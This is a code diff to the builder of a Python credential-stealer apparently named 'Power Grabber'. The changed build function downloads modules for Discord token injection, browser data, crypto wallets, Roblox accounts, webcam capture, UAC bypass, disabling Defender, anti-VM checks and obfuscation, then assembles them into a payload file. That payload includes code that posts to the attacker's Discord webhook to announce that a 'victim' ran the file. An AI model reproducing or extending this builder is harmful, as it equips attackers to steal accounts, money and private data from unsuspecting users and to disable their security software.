@@ -201,27 +201,6 @@ class Power_Grabber(ctk.CTk):
             )
             checkbox.grid(row=row, column=col, padx=10, pady=5, sticky='w')
             checkbox_dict[option] = checkbox
-        anti_vm_checkbox = checkbox_dict['Anti VM']
-        annoy_victim_checkbox = checkbox_dict['Annoy Victim (Audio)']
-        browser_info_checkbox = checkbox_dict['Browser Info']
-        clipboard_contents_checkbox = checkbox_dict['Clipboard contents']
-        disable_defender_checkbox = checkbox_dict['Disable defender (Needs UAC Bypass)']
-        discord_info_checkbox = checkbox_dict['Discord Info']
-        discord_injection_checkbox = checkbox_dict['Discord Injection']
-        email_addresses_checkbox = checkbox_dict['Email Addresses']
-        exact_location_checkbox = checkbox_dict['Exact location']
-        games_info_checkbox = checkbox_dict['Games info']
-        kill_defender_checkbox = checkbox_dict['Kill defender (Needs UAC Bypass)']
-        obfuscate_checkbox = checkbox_dict['Obfuscate']
-        roblox_account_checkbox = checkbox_dict['Roblox account']
-        screenshot_checkbox = checkbox_dict['Screenshot']
-        self_destruct_checkbox = checkbox_dict['Self destruction']
-        system_info_checkbox = checkbox_dict['System info']
-        uac_bypass_checkbox = checkbox_dict['UAC Bypass']
-        vulnerable_port_creation_checkbox = checkbox_dict['Vulnerable port creation']
-        wallets_checkbox = checkbox_dict['Wallets']
-        watchdog_checkbox = checkbox_dict['Watch Dog']
-        webcam_checkbox = checkbox_dict['Webcam']
         pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
         pumper_frame.pack(fill=X, pady=(20, 0))
         pumper_label = ctk.CTkLabel(pumper_frame, text='File Pumper (MB):', 
@@ -240,38 +219,144 @@ class Power_Grabber(ctk.CTk):
         spacer = ctk.CTkFrame(pumper_frame, width=20, fg_color='transparent')
         spacer.pack(side=LEFT, fill=X, expand=True)
         def build_button_clicked(event):
-            webhook_url = webhook_entry.get()
-            file_name = filename_entry.get()
             checkbox_statuses = {
-        "Annoy-Victim": bool(annoy_victim_checkbox.get()),
-        "Anti-VM": bool(anti_vm_checkbox.get()),
-        "Browser-Info": bool(browser_info_checkbox.get()),
-        "Clipboard": bool(clipboard_contents_checkbox.get()),
-        "Disable-Defender": bool(disable_defender_checkbox.get()),
-        "Discord-Info": bool(discord_info_checkbox.get()),
-        "Discord-Injection": bool(discord_injection_checkbox.get()),
-        "Email-Addresses": bool(email_addresses_checkbox.get()),
-        "Exact-location": bool(exact_location_checkbox.get()),
-        "Games-Info": bool(games_info_checkbox.get()),
-        "Kill-Defender": bool(kill_defender_checkbox.get()),
-        "Obfuscate": bool(obfuscate_checkbox.get()),
-        "Roblox-Account": bool(roblox_account_checkbox.get()),
-        "Self-destruction": bool(self_destruct_checkbox.get()),
-        "Screenshot": bool(screenshot_checkbox.get()),
-        "System-Info": bool(system_info_checkbox.get()),
-        "UAC-Bypass": bool(uac_bypass_checkbox.get()),
-        "Vulnerable-port-creation": bool(vulnerable_port_creation_checkbox.get()),
-        "Wallets": bool(wallets_checkbox.get()),
-        "Watch-Dog": bool(watchdog_checkbox.get()),
-        "Webcam": bool(webcam_checkbox.get()),
-        "Filepumper-Value": pumper_combo.get(),
-        "Ping": ping_combo.get(),
+                "Annoy-Victim": bool(checkbox_dict['Annoy Victim (Audio)'].get()),
+                "Anti-VM": bool(checkbox_dict['Anti VM'].get()),
+                "Browser-Info": bool(checkbox_dict['Browser Info'].get()),
+                "Clipboard": bool(checkbox_dict['Clipboard contents'].get()),
+                "Disable-Defender": bool(checkbox_dict['Disable defender (Needs UAC Bypass)'].get()),
+                "Discord-Info": bool(checkbox_dict['Discord Info'].get()),
+                "Discord-Injection": bool(checkbox_dict['Discord Injection'].get()),
+                "Email-Addresses": bool(checkbox_dict['Email Addresses'].get()),
+                "Exact-location": bool(checkbox_dict['Exact location'].get()),
+                "Games-Info": bool(checkbox_dict['Games info'].get()),
+                "Kill-Defender": bool(checkbox_dict['Kill defender (Needs UAC Bypass)'].get()),
+                "Obfuscate": bool(checkbox_dict['Obfuscate'].get()),
+                "Roblox-Account": bool(checkbox_dict['Roblox account'].get()),
+                "Self-destruction": bool(checkbox_dict['Self destruction'].get()),
+                "Screenshot": bool(checkbox_dict['Screenshot'].get()),
+                "System-Info": bool(checkbox_dict['System info'].get()),
+                "UAC-Bypass": bool(checkbox_dict['UAC Bypass'].get()),
+                "Vulnerable-port-creation": bool(checkbox_dict['Vulnerable port creation'].get()),
+                "Wallets": bool(checkbox_dict['Wallets'].get()),
+                "Watch-Dog": bool(checkbox_dict['Watch Dog'].get()),
+                "Webcam": bool(checkbox_dict['Webcam'].get()),
+                "Filepumper-Value": pumper_combo.get(),
+                "Ping": ping_combo.get(),
             }
-            with open("config.txt", "w") as file:
-                file.write(f'Webhook: "{webhook_url}"\n')
-                file.write(f'File-Name: "{file_name}.py"\n')
-                for option, status in checkbox_statuses.items():
-                    file.write(f'{option}: {status}\n')
+            enabled_features = []
+            feature_values = {}
+            webhook_url = webhook_entry.get()
+            filename = filename_entry.get()
+            for term, status in checkbox_statuses.items():
+                if status:
+                    enabled_features.append(term)
+                if term in ['Filepumper-Value', 'Ping']:
+                    feature_values[term] = status
+            def fetch_and_clean_code(url):
+                code = requests.get(url).text.strip()
+                return "\n".join(line for line in code.splitlines() if line.strip() != "")
+            combined_code = ""
+            all_imports = set()
+            def extract_imports(code):
+                imports = []
+                for line in code.splitlines():
+                    if line.startswith("import") or line.startswith("from"):
+                        imports.append(line.strip())
+                return imports
+            if 'Anti-VM' in enabled_features:
+                vm_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/vm-check.py')
+                combined_code += "\n".join([line for line in vm_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(vm_code))
+            if 'Annoy-Victim' in enabled_features:
+                annoy_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Annoy.py')
+                combined_code += "\n".join([line for line in annoy_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(annoy_code))
+            if 'Clipboard' in enabled_features:
+                clipboard_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Clipboard.py')
+                combined_code += "\n".join([line for line in clipboard_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(clipboard_code))
+            if 'Discord-Info' in enabled_features:
+                discord_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Discord-Info.py')
+                combined_code += "\n".join([line for line in discord_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(discord_code))
+            if 'Discord-Injection' in enabled_features:
+                discord_injection_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Injection.py')
+                combined_code += "\n".join([line for line in discord_injection_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(discord_injection_code))
+            if 'Games-Info' in enabled_features:
+                games_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Games.py')
+                combined_code += "\n".join([line for line in games_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(games_code))
+            if 'Exact-location' in enabled_features:
+                location_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Location.py')
+                combined_code += "\n".join([line for line in location_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(location_code))
+            if 'Obfuscate' in enabled_features:
+                obfuscate_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Obfuscate.py')
+                combined_code += "\n".join([line for line in obfuscate_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(obfuscate_code))
+            if 'Roblox-Account' in enabled_features:
+                roblox_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Roblox.py')
+                combined_code += "\n".join([line for line in roblox_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(roblox_code))
+            if 'Screenshot' in enabled_features:
+                screenshot_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Screenshot.py')
+                combined_code += "\n".join([line for line in screenshot_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(screenshot_code))
+            if 'Self-destruction' in enabled_features:
+                destruct_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Self-destruct.py')
+                combined_code += "\n".join([line for line in destruct_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(destruct_code))
+            if 'System-Info' in enabled_features:
+                system_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/System-Info.py')
+                combined_code += "\n".join([line for line in system_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(system_code))
+            if 'Vulnerable-port-creation' in enabled_features:
+                port_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Port.py')
+                combined_code += "\n".join([line for line in port_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(port_code))
+            if 'Webcam' in enabled_features:
+                webcam_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Webcam.py')
+                combined_code += "\n".join([line for line in webcam_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(webcam_code))
+            if 'Browser-Info' in enabled_features:
+                browser_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Browsers.py')
+                combined_code += "\n".join([line for line in browser_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
+                all_imports.update(extract_imports(browser_code))
+            ping_message = ""
+            ping_code = ""
+            if feature_values.get('Ping') == "Here":
+                ping_message = "'@here'"
+            elif feature_values.get('Ping') == "Everyone":
+                ping_message = "'@everyone'"
+            if ping_message:
+                ping_code = f"""
+import requests
+import socket
+hostname = socket.gethostname()
+data = {{
+        "content": {ping_message},
+        "embeds": [
+            {{
+                "title": "Power Grabber Notification",
+                "description": f"{{hostname}} ran the file! Grabbing info on the victim...",
+                "color": 0x8B0000
+            }}
+        ]
+    }}
+response = requests.post("{webhook_url}", json=data)
+if response.status_code == 204:
+    pass
+else:
+    pass
+                """
+            final_imports = "\n".join(sorted(all_imports))
+            final_code = final_imports + "\n" + f"webhook_url = '{webhook_url}'\n" + ping_code + "\n" + combined_code
+            with open(f"{filename}.py", 'w', encoding='utf-8') as file:
+                file.write(final_code)
+            build_button.configure(fg_color='#FF5A5A')
+            build_button.after(200, lambda: build_button.configure(fg_color='#FF3535'))
         build_button = ctk.CTkButton(pumper_frame, text="Build", width=200, height=40,
                                     fg_color='#FF3535', hover_color='#FF3535',
                                     font=('Arial', 18, 'bold'))
@@ -320,4 +405,3 @@ class Power_Grabber(ctk.CTk):
 if __name__ == '__main__':
     app = Power_Grabber()
     app.mainloop()
-    
